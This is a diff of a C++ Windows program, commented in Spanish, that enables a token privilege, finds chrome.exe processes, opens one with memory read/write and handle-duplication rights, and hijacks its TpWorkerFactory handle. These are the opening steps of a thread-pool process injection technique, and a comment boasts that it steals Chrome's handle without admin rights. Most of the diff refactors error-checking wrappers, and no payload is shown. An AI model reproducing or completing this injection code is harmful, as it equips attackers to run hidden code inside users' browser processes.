@@ -26,21 +26,21 @@ vector<BYTE> queryInfo(HANDLE hProcess, TFunc queryFunc, TInfoClass processInfoC
 		Ntstatus = queryFunc(hProcess, processInfoClass, Information.data(), InformationLength, &InformationLength);  //Simplemente llama a la funcion NtQueryInformationProcess, no se porque puso la funcion como parametro.  Envia la direccion de la InformationLength modificar su tamano
 	} while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus); //Ejecuta el bucle mientras no se recupere la info del proceso
 
-    valExp(CHECK_NTSTATUS, "1", Ntstatus);
+    valExp(info(CHECK_NTSTATUS, "1"),   Ntstatus);
 
 	return Information;
 }
 
 HANDLE hijackProcessHandle(wstring wsObjectType, HANDLE hTarget, DWORD dwDesiredAccess) {
-	vector<BYTE> pProcessInfo = valTemp(NO_CHECK,"","2.5",      queryInfo,hTarget,NtQueryInformationProcess,ProcessHandleInformation);
-    const auto pProcessHandleInfo = valExp(CHECK_BAD_PTR,"3",   (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(pProcessInfo.data()) ); //BAD_PTR(pProcessHandleInfo, "3");
+	vector<BYTE> pProcessInfo = valTemp(info(NO_CHECK,"2.5"),   queryInfo, hTarget, NtQueryInformationProcess, ProcessHandleInformation);
+    const auto pProcessHandleInfo = valExp(info(CHECK_BAD_PTR,"3"),   (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(pProcessInfo.data())); //BAD_PTR(pProcessHandleInfo, "3");
 
     for (auto i = 0; i < pProcessHandleInfo->NumberOfHandles; i++) {   //Se ejecuta mientras el iterador sea menor que el numero de handles del proceso
         HANDLE hDuplicatedObj;
-        val(CHECK_FALSE_NULL,"","2",   DuplicateHandle,hTarget,pProcessHandleInfo->Handles[i].HandleValue,GetCurrentProcess(),&hDuplicatedObj,dwDesiredAccess,FALSE,NULL);      //RAISE_FALSE_NULL(res, "2") //Funcion nativa para dupicar handles. Le pasa el handle del proceso a copiarle. Le pasa el handle value del handle a copiar. Le pasa el handle del proceso actual. Le pasa el nivel de acceso y los ultimos dos parametros FALSE y NULL
+        val(info(CHECK_FALSE_NULL,"2"),   DuplicateHandle, hTarget, pProcessHandleInfo->Handles[i].HandleValue, GetCurrentProcess(), &hDuplicatedObj, dwDesiredAccess, FALSE, 0);      //RAISE_FALSE_NULL(res, "2") //Funcion nativa para dupicar handles. Le pasa el handle del proceso a copiarle. Le pasa el handle value del handle a copiar. Le pasa el handle del proceso actual. Le pasa el nivel de acceso y los ultimos dos parametros FALSE y NULL
 
-        vector<BYTE> pObjectInfo = valTemp(NO_CHECK,"","7",   queryInfo,hDuplicatedObj,NtQueryObject,ObjectTypeInformation); //Recupera informacion del handle recien copiado
-        auto pObjectTypeInfo = valExp(CHECK_BAD_PTR,"7.5",    (PPUBLIC_OBJECT_TYPE_INFORMATION)(pObjectInfo.data()));      //BAD_PTR(pObjectTypeInfo, "7");  //Accede a los datos crudos del handle recien copiado
+        vector<BYTE> pObjectInfo = valTemp(info(NO_CHECK,"7"),   queryInfo, hDuplicatedObj, NtQueryObject, ObjectTypeInformation); //Recupera informacion del handle recien copiado
+        auto pObjectTypeInfo = valExp(info(CHECK_BAD_PTR,"7.5"),   (PPUBLIC_OBJECT_TYPE_INFORMATION)(pObjectInfo.data()));      //BAD_PTR(pObjectTypeInfo, "7");  //Accede a los datos crudos del handle recien copiado
 
         if (wsObjectType != wstring(pObjectTypeInfo->TypeName.Buffer)) { //Compara el nombre de tipo del handle coincide con el valor pasado a esta funcion, si es diferente, el bucle continua
             continue;
@@ -56,33 +56,33 @@ HANDLE hijackProcessHandle(wstring wsObjectType, HANDLE hTarget, DWORD dwDesired
 void setCurrentProcessPrivilege(LPCSTR privilegeStr) {
     HANDLE hToken;
     HANDLE hCurrentProcess = GetCurrentProcess(); //Obtiene un psudohandle, es una ubicacion invalida FFFFFFFF, pero aun asi podemos usar este handle con otras funciones... No debemos validar con BAD_PTR por obvias razones
-    val(CHECK_FALSE_NULL,"","10",   OpenProcessToken, hCurrentProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);      //RAISE_FALSE_NULL(res, "10");
+    val(info(CHECK_FALSE_NULL,"10"),   OpenProcessToken, hCurrentProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);      //RAISE_FALSE_NULL(res, "10");
 
     LUID luid;
-    val(CHECK_FALSE_NULL,"","11",   LookupPrivilegeValueA, "", privilegeStr, &luid);     //RAISE_FALSE_NULL(res, "11")
+    val(info(CHECK_FALSE_NULL,"11"),   LookupPrivilegeValueA, "", privilegeStr, &luid);     //RAISE_FALSE_NULL(res, "11")
 
     TOKEN_PRIVILEGES tokenPriv = { 0 };
     tokenPriv.PrivilegeCount = 1;
     tokenPriv.Privileges[0].Luid = luid;
     tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; //SE_PRIVILEGE_REMOVE elimina el privilegio, este lo habilita
 
-    val(CHECK_FALSE_NULL,"","12",   AdjustTokenPrivileges, hToken, FALSE, &tokenPriv, 0, nullptr, nullptr);      //RAISE_FALSE_NULL(res, "12")
+    val(info(CHECK_FALSE_NULL,"12"),   AdjustTokenPrivileges, hToken, FALSE, &tokenPriv, 0, nullptr, nullptr);      //RAISE_FALSE_NULL(res, "12")
 }
 
 vector<DWORD> getPidFromExe(const WCHAR exeName[260]) { //La app de chrome tiene el nombre "chrome.exe"
     vector<DWORD> result;
 
-    HANDLE hSnapshot = val(CHECK_HANDLE,"","15",   CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0);
+    HANDLE hSnapshot = val(info(CHECK_HANDLE,"15"),   CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0);
     
     PROCESSENTRY32 entry;
     entry.dwSize = sizeof(PROCESSENTRY32);
-    val(CHECK_FALSE_NULL,"","16",   Process32First, hSnapshot, &entry);
+    val(info(CHECK_FALSE_NULL,"16"),   Process32First, hSnapshot, &entry);
 
     do {
         if (!wcscmp(entry.szExeFile, exeName)) { //Al comparar arreglos wchar estamos comparando sus direcciones, no las cadenas
             result.push_back(entry.th32ProcessID);
         }
-    } while ( val(NO_CHECK,"","17",   Process32Next, hSnapshot, &entry) ); //No checkeamos porque Process32Next retorna false cuando ya no tiene mas elementos siguientes
+    } while ( val(info(NO_CHECK,"17"),   Process32Next, hSnapshot, &entry)); //No checkeamos porque Process32Next retorna false cuando ya no tiene mas elementos siguientes
 
     return result;
 }
@@ -92,13 +92,15 @@ int main() {
     cout << "\nsetCurrentProcessPrivilege(): Exitoso";
 
     vector<DWORD> chromePids = getPidFromExe(L"chrome.exe"); //cout << "\nThe size is: " << chromePids.size();
+    cout << "\nLos pids de chromeSon: ";
     for (auto const& c : chromePids)
-        std::cout << "\n" << c;
+        std::cout << " " << c;
     
-	DWORD targetPid = 13308; //Pedir al usuario escribir un pid y verificar si el pid existe
-    HANDLE hTarget = val(CHECK_HANDLE,"","13",   OpenProcess, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, targetPid);      //Eliminamos la comprobacion del handle resultado... Talvez los handles no contienen direcciones validas y solo se usan como IDs para pasar a las funciones de la winapi
+    //Con algunos pids de chrome logra robar el handle del proceso sin permisos admin
+    //Tenemos que ejecutar un bucle hasta que el hTarget sea valido
+    HANDLE hTarget = hTarget = val(info(CHECK_HANDLE, "13"),   OpenProcess, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, chromePids[0]);      //Eliminamos la comprobacion del handle resultado... Talvez los handles no contienen direcciones validas y solo se usan como IDs para pasar a las funciones de la winapi
 	
-    HANDLE hProp = val(CHECK_HANDLE,"","14",   hijackProcessHandle, wstring(L"TpWorkerFactory"), hTarget, WORKER_FACTORY_ALL_ACCESS);
+    HANDLE hProp = val(info(CHECK_HANDLE,"14"),   hijackProcessHandle, wstring(L"TpWorkerFactory"), hTarget, WORKER_FACTORY_ALL_ACCESS);
     cout << "\nThe final target address: " << hProp;
 
     system("pause");
